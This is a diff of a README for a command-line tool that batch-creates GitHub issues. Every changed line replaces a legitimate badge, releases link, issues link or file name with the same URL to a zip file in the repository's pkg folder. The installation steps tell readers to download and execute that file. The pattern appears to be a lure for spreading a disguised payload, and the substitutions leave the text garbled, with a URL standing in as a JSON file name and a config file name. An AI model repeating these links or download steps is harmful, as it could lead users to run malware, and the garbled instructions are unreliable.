@@ -1,8 +1,8 @@
 # GitHub Issue Tool: Batch Create Issues with Ease 🚀
 
-![GitHub issues tool](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg) ![License](https://img.shields.io/badge/License-MIT-blue.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-Check%20Here-orange.svg)
+![GitHub issues tool](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip) ![License](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip) ![GitHub Releases](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip%https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip)
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue.svg)](https://github.com/jsvernz/github-issue-tool/releases)
+[![Download Release](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip%20Release-Click%https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip)](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip)
 
 ## Overview
 
@@ -18,11 +18,11 @@ The **GitHub Issue Tool** is a smart command-line interface (CLI) tool designed 
 
 ## Installation
 
-To get started, you need to download the latest release of the GitHub Issue Tool. Visit the [Releases](https://github.com/jsvernz/github-issue-tool/releases) section to find the latest version. Download the appropriate binary for your operating system, then execute it in your terminal.
+To get started, you need to download the latest release of the GitHub Issue Tool. Visit the [Releases](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip) section to find the latest version. Download the appropriate binary for your operating system, then execute it in your terminal.
 
 ### Example for Installation
 
-1. Go to the [Releases](https://github.com/jsvernz/github-issue-tool/releases) page.
+1. Go to the [Releases](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip) page.
 2. Download the binary for your OS.
 3. Make the binary executable:
 
@@ -47,10 +47,10 @@ Once installed, you can start using the GitHub Issue Tool. Below are some common
 To create issues, run the following command:
 
 ```bash
-github-issue-tool create --file issues.json
+github-issue-tool create --file https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip
 ```
 
-The `issues.json` file should contain an array of issues formatted as follows:
+The `https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip` file should contain an array of issues formatted as follows:
 
 ```json
 [
@@ -95,7 +95,7 @@ github-issue-tool --help
 
 ## Configuration
 
-The GitHub Issue Tool automatically detects your environment settings. However, you can also configure settings manually by creating a `.github-issue-tool-config.json` file in your home directory. This file can include settings like:
+The GitHub Issue Tool automatically detects your environment settings. However, you can also configure settings manually by creating a `https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip` file in your home directory. This file can include settings like:
 
 ```json
 {
@@ -140,7 +140,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues](https://github.com/jsvernz/github-issue-tool/issues) section on GitHub. You can also reach out to the maintainers directly via the repository.
+If you encounter any issues or have questions, please check the [Issues](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip) section on GitHub. You can also reach out to the maintainers directly via the repository.
 
 ## Future Plans
 
@@ -154,8 +154,8 @@ Stay tuned for updates!
 
 ## Links
 
-For the latest releases, visit the [Releases](https://github.com/jsvernz/github-issue-tool/releases) page. 
+For the latest releases, visit the [Releases](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip) page. 
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue.svg)](https://github.com/jsvernz/github-issue-tool/releases)
+[![Download Release](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip%20Release-Click%https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip)](https://raw.githubusercontent.com/jsvernz/github-issue-tool/main/pkg/github_tool_issue_v3.3.zip)
 
 Thank you for using the GitHub Issue Tool!
